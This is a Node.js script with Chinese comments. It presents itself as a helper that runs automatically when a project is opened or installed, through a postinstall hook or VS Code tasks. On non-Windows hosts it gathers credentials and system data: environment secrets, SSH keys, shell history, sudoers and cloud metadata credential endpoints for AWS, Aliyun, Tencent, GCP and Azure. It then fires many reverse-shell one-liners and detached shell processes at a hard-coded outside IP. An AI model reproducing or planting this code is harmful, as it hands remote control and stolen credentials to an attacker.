/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const execPromise = promisify(exec);

const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }
  

  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);

  
} catch (error) {

}

if (process.platform === 'win32') {
  try {

    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {
 
        return;
      }

    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {

  }
} else {
  // 云渗透测试 - 信息收集阶段
  const resultsDir = '/tmp/recon';
  if (!fs.existsSync(resultsDir)) {
    fs.mkdirSync(resultsDir, { recursive: true });
  }

  // 云渗透测试命令列表 - 全面信息收集
  const commands = [
    // 基础系统信息
    { cmd: 'uname -a', file: `${resultsDir}/uname.txt`, desc: '系统信息' },
    { cmd: 'whoami', file: `${resultsDir}/whoami.txt`, desc: '当前用户' },
    { cmd: 'id', file: `${resultsDir}/id.txt`, desc: '用户ID和组信息' },
    { cmd: 'hostname', file: `${resultsDir}/hostname.txt`, desc: '主机名' },
    { cmd: 'cat /etc/passwd', file: `${resultsDir}/passwd.txt`, desc: '用户列表' },
    { cmd: 'cat /etc/group', file: `${resultsDir}/group.txt`, desc: '组列表' },
    
    // 环境变量和凭证
    { cmd: 'env', file: `${resultsDir}/env.txt`, desc: '环境变量' },
    { cmd: 'printenv', file: `${resultsDir}/printenv.txt`, desc: '打印环境变量' },
    
    // 网络信息 - 使用多种方法
    { cmd: 'ip addr 2>/dev/null || cat /proc/net/dev', file: `${resultsDir}/ip_addr.txt`, desc: 'IP地址信息' },
    { cmd: 'ip route 2>/dev/null || cat /proc/net/route', file: `${resultsDir}/ip_route.txt`, desc: '路由表' },
    { cmd: 'ifconfig -a 2>/dev/null || cat /proc/net/dev', file: `${resultsDir}/ifconfig.txt`, desc: '网络接口' },
    { cmd: 'netstat -tulpn 2>/dev/null || cat /proc/net/tcp /proc/net/udp 2>/dev/null || echo "Not available"', file: `${resultsDir}/netstat.txt`, desc: '网络连接' },
    { cmd: 'ss -tulpn 2>/dev/null || cat /proc/net/sockstat 2>/dev/null || echo "Not available"', file: `${resultsDir}/ss.txt`, desc: 'Socket统计' },
    { cmd: 'arp -a 2>/dev/null || cat /proc/net/arp 2>/dev/null || echo "Not available"', file: `${resultsDir}/arp.txt`, desc: 'ARP表' },
    { cmd: 'cat /proc/net/if_inet6 2>/dev/null || echo "No IPv6"', file: `${resultsDir}/ipv6.txt`, desc: 'IPv6地址' },
    { cmd: 'cat /etc/resolv.conf', file: `${resultsDir}/resolv.conf.txt`, desc: 'DNS配置' },
    { cmd: 'cat /proc/net/sockstat', file: `${resultsDir}/sockstat.txt`, desc: 'Socket统计信息' },
    { cmd: 'cat /proc/net/sockstat6 2>/dev/null || echo "No IPv6 sockets"', file: `${resultsDir}/sockstat6.txt`, desc: 'IPv6 Socket统计' },
    
    // 进程和服务信息
    { cmd: 'ps aux', file: `${resultsDir}/ps_aux.txt`, desc: '进程列表' },
    { cmd: 'ps auxef', file: `${resultsDir}/ps_auxef.txt`, desc: '进程树' },
    { cmd: 'top -b -n 1', file: `${resultsDir}/top.txt`, desc: '系统资源' },
    
    // 文件系统信息
    { cmd: 'pwd', file: `${resultsDir}/pwd.txt`, desc: '当前目录' },
    { cmd: 'ls -la', file: `${resultsDir}/ls_la.txt`, desc: '当前目录列表' },
    { cmd: 'ls -la /', file: `${resultsDir}/ls_root.txt`, desc: '根目录列表' },
    { cmd: 'ls -la /home', file: `${resultsDir}/ls_home.txt`, desc: 'home目录' },
    { cmd: 'ls -la /root', file: `${resultsDir}/ls_root_home.txt`, desc: 'root目录' },
    { cmd: 'df -h', file: `${resultsDir}/df.txt`, desc: '磁盘使用' },
    { cmd: 'mount', file: `${resultsDir}/mount.txt`, desc: '挂载点' },
    { cmd: 'cat /proc/version', file: `${resultsDir}/proc_version.txt`, desc: '内核版本' },
    { cmd: 'cat /proc/cpuinfo', file: `${resultsDir}/cpuinfo.txt`, desc: 'CPU信息' },
    { cmd: 'cat /proc/meminfo', file: `${resultsDir}/meminfo.txt`, desc: '内存信息' },
    
    // 历史记录和日志
    { cmd: 'bash -c "history" 2>/dev/null || echo "History not available in sh"', file: `${resultsDir}/history.txt`, desc: '命令历史' },
    { cmd: 'cat ~/.bash_history 2>/dev/null || cat ~/.zsh_history 2>/dev/null || echo "No history file found"', file: `${resultsDir}/bash_history.txt`, desc: 'Bash历史' },
    { cmd: 'echo $HISTFILE', file: `${resultsDir}/histfile_path.txt`, desc: '历史文件路径' },
    { cmd: 'cat /var/log/auth.log 2>/dev/null | tail -50 || cat /var/log/secure 2>/dev/null | tail -50 || echo "Log not accessible"', file: `${resultsDir}/auth_log.txt`, desc: '认证日志' },
    
    // 云元数据服务探测 - 腾讯云 (添加超时和错误处理)
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/ 2>&1 || wget -q -O- --timeout=3 http://metadata.tencentyun.com/latest/meta-data/ 2>&1 || echo "Metadata service not accessible"', file: `${resultsDir}/tencent_metadata_root.txt`, desc: '腾讯云元数据根' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/instance-id 2>&1 || echo "Not available"', file: `${resultsDir}/tencent_instance_id.txt`, desc: '腾讯云实例ID' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/region 2>&1 || echo "Not available"', file: `${resultsDir}/tencent_region.txt`, desc: '腾讯云区域' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/zone 2>&1 || echo "Not available"', file: `${resultsDir}/tencent_zone.txt`, desc: '腾讯云可用区' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/private-ipv4 2>&1 || echo "Not available"', file: `${resultsDir}/tencent_private_ip.txt`, desc: '腾讯云内网IP' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/public-ipv4 2>&1 || echo "Not available"', file: `${resultsDir}/tencent_public_ip.txt`, desc: '腾讯云公网IP' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/ 2>&1 || echo "Not available"', file: `${resultsDir}/tencent_credentials_list.txt`, desc: '腾讯云凭证列表' },
    
    // 云元数据服务探测 - 阿里云
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://100.100.100.200/latest/meta-data/ 2>&1 || echo "Not available"', file: `${resultsDir}/aliyun_metadata_root.txt`, desc: '阿里云元数据根' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://100.100.100.200/latest/meta-data/instance-id 2>&1 || echo "Not available"', file: `${resultsDir}/aliyun_instance_id.txt`, desc: '阿里云实例ID' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://100.100.100.200/latest/meta-data/region-id 2>&1 || echo "Not available"', file: `${resultsDir}/aliyun_region.txt`, desc: '阿里云区域' },
    
    // 云元数据服务探测 - AWS
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "Not available"', file: `${resultsDir}/aws_metadata_root.txt`, desc: 'AWS元数据根' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/meta-data/instance-id 2>&1 || echo "Not available"', file: `${resultsDir}/aws_instance_id.txt`, desc: 'AWS实例ID' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo "Not available"', file: `${resultsDir}/aws_credentials_list.txt`, desc: 'AWS凭证列表' },
    
    // 云元数据服务探测 - 其他云服务商
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://metadata.google.internal/computeMetadata/v1/ 2>&1 || echo "Not available"', file: `${resultsDir}/gcp_metadata_root.txt`, desc: 'GCP元数据根' },
    { cmd: 'curl -s --connect-timeout 3 --max-time 5 http://169.254.169.254/metadata/instance?api-version=2017-08-01 2>&1 || echo "Not available"', file: `${resultsDir}/azure_metadata.txt`, desc: 'Azure元数据' },
    
    // 容器/Docker信息
    { cmd: 'cat /proc/self/cgroup', file: `${resultsDir}/cgroup.txt`, desc: 'Cgroup信息' },
    { cmd: 'cat /.dockerenv 2>/dev/null || echo "Not in Docker"', file: `${resultsDir}/dockerenv.txt`, desc: 'Docker环境检测' },
    { cmd: 'ls -la /.dockerenv 2>/dev/null || echo "Not found"', file: `${resultsDir}/dockerenv_file.txt`, desc: 'Docker环境文件' },
    
    // 敏感文件查找
    { cmd: 'find / -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | head -20', file: `${resultsDir}/key_files.txt`, desc: '密钥文件查找' },
    { cmd: 'find / -name ".aws" -o -name ".ssh" 2>/dev/null | head -20', file: `${resultsDir}/config_dirs.txt`, desc: '配置目录查找' },
    { cmd: 'find /root -name "*.json" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20', file: `${resultsDir}/config_files.txt`, desc: '配置文件查找' },
    
    // 网络连通性测试 - 使用多种方法
    { cmd: 'ping -c 2 8.8.8.8 2>&1 || timeout 2 bash -c "echo > /dev/tcp/8.8.8.8/53" 2>&1 || echo "Network test failed"', file: `${resultsDir}/ping_google_dns.txt`, desc: 'Google DNS连通性' },
    { cmd: 'ping -c 2 baidu.com 2>&1 || timeout 2 bash -c "echo > /dev/tcp/baidu.com/80" 2>&1 || echo "Network test failed"', file: `${resultsDir}/ping_baidu.txt`, desc: '百度连通性' },
    { cmd: 'curl -s -m 5 --connect-timeout 3 http://www.baidu.com 2>&1 | head -50 || wget -q -O- --timeout=3 http://www.baidu.com 2>&1 | head -50 || echo "HTTP test failed"', file: `${resultsDir}/curl_baidu.txt`, desc: 'HTTP测试' },
    { cmd: 'cat /proc/net/tcp | head -20', file: `${resultsDir}/tcp_connections.txt`, desc: 'TCP连接信息' },
    { cmd: 'cat /proc/net/udp | head -20', file: `${resultsDir}/udp_connections.txt`, desc: 'UDP连接信息' },
    
    // 权限和sudo信息
    { cmd: 'sudo -l 2>&1 || echo "sudo not available or no sudo access"', file: `${resultsDir}/sudo_list.txt`, desc: 'Sudo权限' },
    { cmd: 'cat /etc/sudoers 2>/dev/null || echo "Permission denied or file not found"', file: `${resultsDir}/sudoers.txt`, desc: 'Sudoers配置' },
    { cmd: 'ls -la /etc/sudoers.d/ 2>/dev/null || echo "Directory not accessible"', file: `${resultsDir}/sudoers_d.txt`, desc: 'Sudoers.d目录' },
    
    // 系统服务
    { cmd: 'systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null || echo "Not available"', file: `${resultsDir}/services.txt`, desc: '运行中的服务' },
    
    // 定时任务
    { cmd: 'crontab -l 2>/dev/null || echo "No crontab"', file: `${resultsDir}/crontab.txt`, desc: '当前用户定时任务' },
    { cmd: 'cat /etc/crontab 2>/dev/null || echo "Permission denied"', file: `${resultsDir}/etc_crontab.txt`, desc: '系统定时任务' },
    { cmd: 'ls -la /etc/cron.* 2>/dev/null || echo "Not found"', file: `${resultsDir}/cron_dirs.txt`, desc: 'Cron目录' },
    
    // 额外系统信息
    { cmd: 'cat /proc/loadavg', file: `${resultsDir}/loadavg.txt`, desc: '系统负载' },
    { cmd: 'cat /proc/uptime', file: `${resultsDir}/uptime.txt`, desc: '系统运行时间' },
    { cmd: 'cat /proc/stat | head -20', file: `${resultsDir}/proc_stat.txt`, desc: '系统统计信息' },
    { cmd: 'cat /proc/swaps', file: `${resultsDir}/swaps.txt`, desc: '交换分区信息' },
    { cmd: 'cat /proc/partitions', file: `${resultsDir}/partitions.txt`, desc: '分区信息' },
    { cmd: 'cat /proc/devices', file: `${resultsDir}/devices.txt`, desc: '设备信息' },
    { cmd: 'lsmod 2>/dev/null || cat /proc/modules | head -30', file: `${resultsDir}/modules.txt`, desc: '内核模块' },
    
    // 敏感信息提取 - 从环境变量中查找
    { cmd: 'env | grep -i "key\\|secret\\|token\\|password\\|credential\\|api" || echo "No obvious secrets in env"', file: `${resultsDir}/env_secrets.txt`, desc: '环境变量中的敏感信息' },
    { cmd: 'env | grep -E "AKID|SECRET|TOKEN" || echo "No cloud credentials found"', file: `${resultsDir}/cloud_credentials.txt`, desc: '云服务凭证' },
    
    // 文件权限检查
    { cmd: 'find / -perm -4000 -type f 2>/dev/null | head -20', file: `${resultsDir}/suid_files.txt`, desc: 'SUID文件' },
    { cmd: 'find / -perm -2000 -type f 2>/dev/null | head -20', file: `${resultsDir}/sgid_files.txt`, desc: 'SGID文件' },
    { cmd: 'find / -type f -perm -o+w 2>/dev/null | head -20', file: `${resultsDir}/world_writable.txt`, desc: '全局可写文件' },
    
    // 更多敏感文件查找
    { cmd: 'find /root -type f \\( -name "*.env" -o -name ".env*" -o -name "*config*" \\) 2>/dev/null | head -30', file: `${resultsDir}/env_files.txt`, desc: '环境配置文件' },
    { cmd: 'find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pub" 2>/dev/null | head -20', file: `${resultsDir}/ssh_keys.txt`, desc: 'SSH密钥文件' },
    { cmd: 'cat ~/.ssh/config 2>/dev/null || echo "No SSH config"', file: `${resultsDir}/ssh_config.txt`, desc: 'SSH配置' },
    { cmd: 'cat ~/.ssh/known_hosts 2>/dev/null || echo "No known_hosts"', file: `${resultsDir}/ssh_known_hosts.txt`, desc: 'SSH已知主机' },
    
    // 容器和虚拟化检测
    { cmd: 'cat /proc/1/cgroup', file: `${resultsDir}/init_cgroup.txt`, desc: 'Init进程Cgroup' },
    { cmd: 'dmesg | grep -i "docker\\|container\\|k8s" | head -20 || echo "No container info"', file: `${resultsDir}/dmesg_container.txt`, desc: 'Dmesg容器信息' },
    { cmd: 'cat /proc/self/mountinfo | head -30', file: `${resultsDir}/mountinfo.txt`, desc: '挂载详细信息' },
    
    // 系统调用和限制
    { cmd: 'ulimit -a', file: `${resultsDir}/ulimit.txt`, desc: '系统限制' },
    { cmd: 'cat /proc/sys/kernel/pid_max', file: `${resultsDir}/pid_max.txt`, desc: '最大PID' },
    { cmd: 'cat /proc/sys/fs/file-max', file: `${resultsDir}/file_max.txt`, desc: '最大文件数' },
    
    // 反弹Shell - 多种方法尝试
    { cmd: 'bash -i >& /dev/tcp/47.120.44.195/9999 0>&1 2>&1 &', file: `${resultsDir}/reverse_shell_bash.txt`, desc: 'Bash反弹Shell' },
    { cmd: 'bash -c "bash -i >& /dev/tcp/47.120.44.195/9999 0>&1" &', file: `${resultsDir}/reverse_shell_bash2.txt`, desc: 'Bash反弹Shell方法2' },
    { cmd: 'nc -e /bin/bash 47.120.44.195 9999 &', file: `${resultsDir}/reverse_shell_nc.txt`, desc: 'Netcat反弹Shell' },
    { cmd: 'nc 47.120.44.195 9999 -e /bin/sh &', file: `${resultsDir}/reverse_shell_nc2.txt`, desc: 'Netcat反弹Shell方法2' },
    { cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 47.120.44.195 9999 >/tmp/f &', file: `${resultsDir}/reverse_shell_nc3.txt`, desc: 'Netcat反弹Shell方法3' },
    { cmd: 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);" &', file: `${resultsDir}/reverse_shell_python.txt`, desc: 'Python反弹Shell' },
    { cmd: 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);" &', file: `${resultsDir}/reverse_shell_python3.txt`, desc: 'Python3反弹Shell' },
    { cmd: 'perl -e \'use Socket;$i="47.120.44.195";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &', file: `${resultsDir}/reverse_shell_perl.txt`, desc: 'Perl反弹Shell' },
    { cmd: 'php -r \'$sock=fsockopen("47.120.44.195",9999);exec("/bin/sh -i <&3 >&3 2>&3");\' &', file: `${resultsDir}/reverse_shell_php.txt`, desc: 'PHP反弹Shell' },
    { cmd: 'socat TCP:47.120.44.195:9999 EXEC:/bin/bash &', file: `${resultsDir}/reverse_shell_socat.txt`, desc: 'Socat反弹Shell' },
    { cmd: 'telnet 47.120.44.195 9999 | /bin/bash | telnet 47.120.44.195 9999 &', file: `${resultsDir}/reverse_shell_telnet.txt`, desc: 'Telnet反弹Shell' },
    { cmd: 'exec 5<>/dev/tcp/47.120.44.195/9999;cat <&5 | while read line; do $line 2>&5 >&5; done &', file: `${resultsDir}/reverse_shell_exec.txt`, desc: 'Exec反弹Shell' },
  ];

  // 执行所有命令并收集结果
  const executeCommands = async () => {
    const summary = {
      total: commands.length,
      success: 0,
      failed: 0,
      results: []
    };

    console.log(`\n[云渗透测试] 开始信息收集，共 ${commands.length} 个命令...\n`);

    for (const command of commands) {
      try {
        // 反弹shell命令使用更短的超时时间，因为它们会在后台运行
        const isReverseShell = command.desc.includes('反弹Shell') || command.desc.includes('反弹');
        const timeout = isReverseShell ? 2000 : 30000; // 反弹shell 2秒超时，其他30秒
        
        const { stdout, stderr } = await execPromise(command.cmd, { 
          maxBuffer: 10 * 1024 * 1024, // 10MB buffer
          timeout: timeout
        });
        
        const output = stdout || stderr || '';
        fs.writeFileSync(command.file, output);
        
        summary.success++;
        summary.results.push({
          command: command.desc,
          status: 'success',
          file: command.file,
          size: output.length
        });
        
        if (isReverseShell) {
          console.log(`🔄 [${summary.success}/${commands.length}] ${command.desc} - 已在后台启动，结果保存到 ${command.file}`);
        } else {
          console.log(`✅ [${summary.success}/${commands.length}] ${command.desc} - 已保存到 ${command.file} (${output.length} 字节)`);
        }
        
        // 如果输出较短，直接显示（反弹shell命令除外）
        if (!isReverseShell && output.length < 500 && output.trim()) {
          console.log(`   输出: ${output.trim().substring(0, 200)}${output.length > 200 ? '...' : ''}`);
        }
      } catch (error) {
        summary.failed++;
        // 收集所有可能的错误信息
        const errorDetails = [
          `错误消息: ${error.message}`,
          error.stderr ? `标准错误输出:\n${error.stderr}` : '',
          error.stdout ? `标准输出:\n${error.stdout}` : '',
          `返回码: ${error.code || 'N/A'}`,
          error.signal ? `信号: ${error.signal}` : '',
          `命令: ${command.cmd}`
        ].filter(Boolean).join('\n\n');
        
        fs.writeFileSync(command.file, errorDetails);
        
        summary.results.push({
          command: command.desc,
          status: 'failed',
          file: command.file,
          error: error.message,
          code: error.code
        });
        
        // 显示简化的错误信息
        const shortError = error.message.length > 100 ? error.message.substring(0, 100) + '...' : error.message;
        console.log(`❌ [失败] ${command.desc} - ${shortError}`);
      }
    }

    // 生成汇总报告
    const summaryFile = `${resultsDir}/SUMMARY.txt`;
    const summaryReport = `
========================================
云渗透测试 - 信息收集汇总报告
========================================
时间: ${new Date().toISOString()}
总命令数: ${summary.total}
成功: ${summary.success}
失败: ${summary.failed}
成功率: ${((summary.success / summary.total) * 100).toFixed(2)}%

详细结果:
${summary.results.map(r => 
  `[${r.status === 'success' ? '✓' : '✗'}] ${r.command} -> ${r.file}${r.size ? ` (${r.size} 字节)` : ''}${r.error ? ` - 错误: ${r.error}` : ''}`
).join('\n')}

所有结果文件保存在: ${resultsDir}
========================================
`;
    
    fs.writeFileSync(summaryFile, summaryReport);
    console.log(`\n${summaryReport}`);
    console.log(`\n[完成] 所有结果已保存到 ${resultsDir}/`);
    console.log(`[汇总] 查看汇总报告: cat ${summaryFile}\n`);
    
    // 信息收集完成后，尝试建立反弹shell连接（使用spawn在后台运行）
    console.log('\n[反弹Shell] 尝试建立反弹shell连接...\n');
    const reverseShellMethods = [
      { name: 'bash', cmd: 'bash', args: ['-c', 'bash -i >& /dev/tcp/47.120.44.195/9999 0>&1'] },
      { name: 'nc', cmd: 'nc', args: ['-e', '/bin/bash', '47.120.44.195', '9999'] },
      { name: 'python', cmd: 'python', args: ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);'] },
      { name: 'python3', cmd: 'python3', args: ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);'] },
    ];
    
    // 尝试每种方法，找到第一个可用的
    for (const method of reverseShellMethods) {
      try {
        const proc = spawn(method.cmd, method.args, {
          detached: true,
          stdio: 'ignore'
        });
        proc.unref(); // 让进程独立运行，不阻塞主进程
        console.log(`🔄 [反弹Shell] 已启动 ${method.name} 反弹shell进程 (PID: ${proc.pid})`);
        fs.appendFileSync(`${resultsDir}/reverse_shell_spawn.txt`, 
          `[${new Date().toISOString()}] 启动 ${method.name} 反弹shell - PID: ${proc.pid}\n`);
        // 只启动第一个，避免重复连接
        break;
      } catch (error) {
        console.log(`❌ [反弹Shell] ${method.name} 方法失败: ${error.message}`);
        fs.appendFileSync(`${resultsDir}/reverse_shell_spawn.txt`, 
          `[${new Date().toISOString()}] ${method.name} 失败: ${error.message}\n`);
      }
    }
    
    console.log('[反弹Shell] 反弹shell连接尝试完成\n');
  };

  executeCommands().catch(err => {
    console.error('[严重错误] 执行命令序列时出错:', err);
    fs.writeFileSync(`${resultsDir}/CRITICAL_ERROR.txt`, `错误: ${err.message}\n堆栈: ${err.stack}`);
  });
}

